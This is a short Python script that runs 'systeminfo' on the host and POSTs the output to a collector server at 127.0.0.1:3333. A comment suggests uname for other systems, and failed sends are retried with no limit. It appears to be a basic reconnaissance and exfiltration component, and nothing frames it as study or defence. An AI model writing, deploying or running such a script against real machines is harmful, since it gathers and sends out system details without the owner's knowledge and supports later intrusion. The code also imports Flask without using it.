from flask import Flask, request
import os
import time

url = "http://127.0.0.1:3333"
data = {"info": os.popen("systeminfo").read()}
#use uname if the target is os
try:
    import requests
except ModuleNotFoundError:
    print("Requests module not found. Skipping HTTP request functionality.")

def main():
    if 'requests' in globals():
        try:
            res = requests.post(url=url, json=data)
            if res.status_code != 200:
                raise Exception("Response status code is not 200")
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(3)
            main()
    else:
        print("Skipping request to Flask server.")

if __name__ == "__main__":
    main()
